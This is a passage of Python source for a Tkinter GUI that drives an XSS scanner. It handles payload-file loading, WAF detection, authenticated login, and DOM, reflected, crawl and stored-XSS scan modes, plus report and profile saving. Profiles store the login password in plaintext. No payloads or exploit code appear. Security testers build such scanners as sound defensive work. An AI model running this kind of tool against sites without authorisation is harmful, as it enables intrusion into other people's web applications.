            self.dom_input_label.grid_forget()
            self.dom_input_entry.grid_forget()
            self.max_depth_label.grid_forget()
            self.max_depth_entry.grid_forget()

    def parse_headers(self):
        headers = {}
        for line in self.headers_text.get("1.0", tk.END).strip().split('\n'):
            if ':' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
        return headers

    def parse_cookies(self):
        cookies = {}
        for line in self.cookies_text.get("1.0", tk.END).strip().split('\n'):
            if '=' in line:
                key, value = line.split('=', 1)
                cookies[key.strip()] = value.strip()
        return cookies

    def load_payloads_from_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "r", encoding="utf-8") as f:
                self.loaded_payloads = list(set(line.strip() for line in f if line.strip()))
            self.update_payload_count_label()
            self.queue_message(f"Loaded {len(self.loaded_payloads)} unique payloads.\n")

    def update_payload_count_label(self):
        count = len(self.loaded_payloads) if self.loaded_payloads else 0
        self.payload_count_label.config(text=f"Loaded Payloads: {count}")

    def get_payloads_to_use(self):
        return self.loaded_payloads

    def start_scan(self):
        if self.scanning:
            messagebox.showwarning("Scan in Progress", "A scan is already running.")
            return

        target_url = self.url_entry.get()
        if not target_url:
            messagebox.showwarning("Input Error", "Please enter a target URL.")
            return

        scan_type = self.scan_type_var.get()
        if scan_type == "Scan Single URL (DOM)":
            dom_selector = self.dom_input_entry.get()
            if not dom_selector:
                messagebox.showwarning("Input Error", "Please enter a DOM element selector for DOM scanning.")
                return

        try:
            scan_timeout = int(self.timeout_var.get())
            if scan_timeout <= 0:
                raise ValueError("Timeout must be a positive integer.")
        except ValueError as e:
            messagebox.showwarning("Input Error", f"Invalid timeout value: {e}")
            return

        try:
            num_threads = int(self.threads_var.get())
            if num_threads <= 0:
                raise ValueError("Number of threads must be a positive integer.")
        except ValueError as e:
            messagebox.showwarning("Input Error", f"Invalid number of threads: {e}")
            return

        max_depth = 0
        if scan_type in ["Crawl and Scan", "Stored XSS Scan"]:
            try:
                max_depth = int(self.max_depth_var.get())
                if max_depth <= 0:
                    raise ValueError("Max depth must be a positive integer.")
            except ValueError as e:
                messagebox.showwarning("Input Error", f"Invalid max depth value: {e}")
                return

        custom_headers = self.parse_headers()
        custom_cookies = self.parse_cookies()
        payloads = self.get_payloads_to_use()
        if not payloads:
            messagebox.showwarning("Payload Error", "No payloads available for scanning.")
            return

        blacklist = [b.strip() for b in self.blacklist_entry.get().split(',') if b.strip()]
        proxy = self.proxy_entry.get() or None
        login_url = self.login_entry.get()
        username = self.username_entry.get()
        password = self.password_entry.get()
        username_selector = self.username_selector_entry.get() or 'input[name="username"]'
        password_selector = self.password_selector_entry.get() or 'input[name="password"]'
        submit_selector = self.submit_selector_entry.get() or None

        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, f"Starting scan of: {target_url} ({scan_type})\n\n")
        self.status_label.config(text="Status: Scanning...")
        self.vulnerable_count_label.config(text="Vulnerable Findings: 0")
        self.save_report_button.config(state=tk.DISABLED)
        self.scan_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.pause_button.config(state=tk.NORMAL)
        self.resume_button.config(state=tk.DISABLED)

        self.scanning = True
        self.engine.stop_scan_flag = False
        self.engine.pause_scan_flag = False
        self.engine.vulnerable_findings = []
        self.engine.crawled_urls = set()
        while not self.engine.injection_points.empty():
            self.engine.injection_points.get()

        scan_thread = threading.Thread(target=self.perform_scan, args=(target_url, custom_headers, custom_cookies, scan_timeout, num_threads, scan_type, payloads, max_depth, blacklist, proxy, login_url, username, password, username_selector, password_selector, submit_selector))
        scan_thread.start()

    def perform_scan(self, target_url, custom_headers, custom_cookies, scan_timeout, num_threads, scan_type, payloads, max_depth, blacklist, proxy, login_url, username, password, username_selector, password_selector, submit_selector):
        try:
            parsed_url = urlparse(target_url)
            target_domain = parsed_url.netloc

            self.queue_message(f"Scanning domain: {target_domain}\n")

            self.engine.detect_waf(target_url, custom_headers, custom_cookies)

            if login_url and username and password:
                self.engine.perform_login(login_url, username, password, username_selector, password_selector, submit_selector, custom_headers, custom_cookies, scan_timeout)

            if scan_type == "Scan Single URL (DOM)":
                dom_selector = self.dom_input_entry.get()
                self.queue_message(f"Performing DOM scan on element: {dom_selector}\n")
                self.engine.scan_dom(target_url, dom_selector, payloads, custom_headers, custom_cookies, scan_timeout, proxy)
            elif scan_type == "Scan Single URL (GET/POST)":
                self.queue_message(f"Scanning single URL: {target_url}\n")
                self.engine._process_url_for_injection_points(target_url, custom_headers, custom_cookies, scan_timeout, target_domain)
                self.engine.scan_injection_points(payloads, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, proxy)
            elif scan_type == "Crawl and Scan":
                self.queue_message(f"Starting crawl and scan from: {target_url}\n")
                self.engine.crawl_and_scan(target_url, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, payloads, max_depth, blacklist, proxy)
            elif scan_type == "Stored XSS Scan":
                self.queue_message(f"Starting stored XSS scan from: {target_url}\n")
                self.engine.scan_stored_xss(target_url, custom_headers, custom_cookies, scan_timeout, target_domain, num_threads, payloads, max_depth, blacklist, proxy)

            if self.engine.stop_scan_flag:
                self.queue_message("\n--- Scan Interrupted by User ---\n")
            elif self.engine.pause_scan_flag:
                self.queue_message("\n--- Scan Paused ---\n")
            else:
                self.queue_message("\n--- Scan Finished ---\n")

        except Exception as e:
            logging.exception("An unexpected error occurred during scan setup:")
            self.queue_message(f"\nAn unexpected error occurred during scan setup: {e}\n")
            self.master.after(0, lambda e=e: messagebox.showerror("Error", f"An unexpected error occurred: {e}"))

        finally:
            if self.engine.driver:
                self.engine.driver.quit()
                self.engine.driver = None
            self.scanning = False
            self.engine.pause_scan_flag = False
            self.master.after(0, lambda: self.status_label.config(text="Status: Idle"))
            self.master.after(0, lambda: self.scan_button.config(state=tk.NORMAL))
            self.master.after(0, lambda: self.stop_button.config(state=tk.DISABLED))
            self.master.after(0, lambda: self.pause_button.config(state=tk.DISABLED))
            if self.engine.vulnerable_findings:
                self.master.after(0, lambda: self.save_report_button.config(state=tk.NORMAL))

    def stop_scan(self):
        if self.scanning:
            self.engine.stop_scan_flag = True
            self.queue_message("\n[!] Stop signal received. Attempting to stop scan gracefully...\n")
            self.status_label.config(text="Status: Stopping...")
            self.stop_button.config(state=tk.DISABLED)

    def pause_scan(self):
        if self.scanning:
            self.engine.pause_scan_flag = True
            self.queue_message("\n[!] Pause signal received...\n")
            self.engine.serialize_state('scan_state.json')
            self.status_label.config(text="Status: Paused")
            self.pause_button.config(state=tk.DISABLED)
            self.resume_button.config(state=tk.NORMAL)

    def resume_scan(self):
        if not self.scanning:
            self.engine.load_state('scan_state.json')
            self.engine.pause_scan_flag = False
            self.status_label.config(text="Status: Scanning...")
            self.resume_button.config(state=tk.DISABLED)
            self.pause_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.NORMAL)
            self.scanning = True
            scan_thread = threading.Thread(target=self.perform_scan, args=(self.url_entry.get(), self.parse_headers(), self.parse_cookies(), int(self.timeout_var.get()), int(self.threads_var.get()), self.scan_type_var.get(), self.get_payloads_to_use(), int(self.max_depth_var.get()), [b.strip() for b in self.blacklist_entry.get().split(',') if b.strip()], self.proxy_entry.get() or None, self.login_entry.get(), self.username_entry.get(), self.password_entry.get(), self.username_selector_entry.get(), self.password_selector_entry.get(), self.submit_selector_entry.get()))
            scan_thread.start()

    def queue_message(self, message):
        self.scan_queue.put(message)
        self.master.after(100, self.process_queue)

    def process_queue(self):
        while not self.scan_queue.empty():
            message = self.scan_queue.get()
            self.results_text.insert(tk.END, message)
            self.results_text.see(tk.END)

    def save_report_menu(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("HTML files", "*.html"), ("JSON files", "*.json")])
        if file_path:
            self.save_report(file_path)

    def save_report(self, file_path):
        if not self.engine.vulnerable_findings:
            messagebox.showinfo("No Findings", "No vulnerabilities were found to report.")
            return

        ext = os.path.splitext(file_path)[1].lower()
        try:
            if ext == ".txt":
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(f"XSS Scan Report\n")
                    f.write(f"Target URL: {self.url_entry.get()}\n")
                    f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("-" * 30 + "\n\n")
                    if self.engine.vulnerable_findings:
                        f.write("Potential XSS Vulnerabilities Found:\n\n")
                        for finding in self.engine.vulnerable_findings:
                            f.write(f"Type: {finding.get('type', 'Unknown')}\n")
                            if finding.get('parameter'):
                                f.write(f"Parameter: {finding['parameter']}\n")
                            if finding.get('element_selector'):
                                f.write(f"Element Selector: {finding['element_selector']}\n")
                            f.write(f"Method: {finding.get('method', 'Unknown')}\n")
                            f.write(f"Payload: {finding.get('payload', 'N/A')}\n")
                            f.write(f"URL Tested: {finding.get('url', 'N/A')}\n")
                            f.write(f"Details: {finding.get('details', 'No details provided')}\n")
                            f.write(f"Request: {finding.get('request', 'N/A')}\n")
                            f.write(f"Response Snippet: {finding.get('response_snippet', 'N/A')}\n")
                            f.write("-" * 10 + "\n")
                    else:
                        f.write("No potential XSS vulnerabilities found with the tested payloads and parameters.\n")
            elif ext == ".html":
                root = etree.Element("html")
                body = etree.SubElement(root, "body")
                etree.SubElement(body, "h1").text = "XSS Scan Report"
                etree.SubElement(body, "p").text = f"Target URL: {self.url_entry.get()}"
                etree.SubElement(body, "p").text = f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                table = etree.SubElement(body, "table", border="1")
                header = etree.SubElement(table, "tr")
                for col in ["Type", "Parameter", "Element Selector", "Method", "Payload", "URL Tested", "Details", "Request", "Response Snippet"]:
                    etree.SubElement(header, "th").text = col
                for finding in self.engine.vulnerable_findings:
                    row = etree.SubElement(table, "tr")
                    etree.SubElement(row, "td").text = finding.get('type', 'Unknown')
                    etree.SubElement(row, "td").text = finding.get('parameter', '')
                    etree.SubElement(row, "td").text = finding.get('element_selector', '')
                    etree.SubElement(row, "td").text = finding.get('method', 'Unknown')
                    etree.SubElement(row, "td").text = finding.get('payload', 'N/A')
                    etree.SubElement(row, "td").text = finding.get('url', 'N/A')
                    etree.SubElement(row, "td").text = finding.get('details', 'No details provided')
                    etree.SubElement(row, "td").text = finding.get('request', 'N/A')
                    etree.SubElement(row, "td").text = finding.get('response_snippet', 'N/A')
                with open(file_path, 'wb') as f:
                    f.write(etree.tostring(root, pretty_print=True))
            elif ext == ".json":
                with open(file_path, "w", encoding="utf-8") as f:
                    json.dump({
                        "target_url": self.url_entry.get(),
                        "scan_date": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        "findings": self.engine.vulnerable_findings
                    }, f, indent=4)
            messagebox.showinfo("Report Saved", f"Scan report saved to:\n{file_path}")
            logging.info(f"Report saved to: {file_path}")

        except Exception as e:
            messagebox.showerror("Save Error", f"Error saving report: {e}")
            logging.exception("Error saving report:")

    def save_profile(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if file_path:
            profile = {
                "target_url": self.url_entry.get(),
                "scan_type": self.scan_type_var.get(),
                "dom_selector": self.dom_input_entry.get(),
                "timeout": self.timeout_var.get(),
                "threads": self.threads_var.get(),
                "max_depth": self.max_depth_var.get(),
                "proxy": self.proxy_entry.get(),
                "login_url": self.login_entry.get(),
                "username": self.username_entry.get(),
                "password": self.password_entry.get(),
                "username_selector": self.username_selector_entry.get(),
                "password_selector": self.password_selector_entry.get(),
                "submit_selector": self.submit_selector_entry.get(),
                "blacklist": self.blacklist_entry.get(),
                "headers": self.headers_text.get("1.0", tk.END).strip(),
                "cookies": self.cookies_text.get("1.0", tk.END).strip(),
            }
            with open(file_path, "w", encoding="utf-8") as f:
                json.dump(profile, f, indent=4)
            messagebox.showinfo("Profile Saved", f"Profile saved to:\n{file_path}")

    def load_profile(self):
        file_path = filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
        if file_path:
            with open(file_path, "r", encoding="utf-8") as f:
                profile = json.load(f)
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, profile.get("target_url", ""))
            self.scan_type_var.set(profile.get("scan_type", "Crawl and Scan"))
            self.dom_input_entry.delete(0, tk.END)
            self.dom_input_entry.insert(0, profile.get("dom_selector", ""))
            self.timeout_var.set(profile.get("timeout", "10"))
            self.threads_var.set(profile.get("threads", "5"))
            self.max_depth_var.set(profile.get("max_depth", "3"))
            self.proxy_entry.delete(0, tk.END)
            self.proxy_entry.insert(0, profile.get("proxy", ""))
            self.login_entry.delete(0, tk.END)
            self.login_entry.insert(0, profile.get("login_url", ""))
            self.username_entry.delete(0, tk.END)
            self.username_entry.insert(0, profile.get("username", ""))
            self.password_entry.delete(0, tk.END)
            self.password_entry.insert(0, profile.get("password", ""))
            self.username_selector_entry.delete(0, tk.END)
            self.username_selector_entry.insert(0, profile.get("username_selector", "input[name=\"username\"]"))
            self.password_selector_entry.delete(0, tk.END)
            self.password_selector_entry.insert(0, profile.get("password_selector", "input[name=\"password\"]"))
            self.submit_selector_entry.delete(0, tk.END)
            self.submit_selector_entry.insert(0, profile.get("submit_selector", ""))
            self.blacklist_entry.delete(0, tk.END)
            self.blacklist_entry.insert(0, profile.get("blacklist", ""))
            self.headers_text.delete(1.0, tk.END)
            self.headers_text.insert(tk.END, profile.get("headers", ""))
            self.cookies_text.delete(1.0, tk.END)
            self.cookies_text.insert(tk.END, profile.get("cookies", ""))
            messagebox.showinfo("Profile Loaded", f"Profile loaded from:\n{file_path}")

root = tk.Tk()
gui = XSSScannerGUI(root)
root.mainloop()
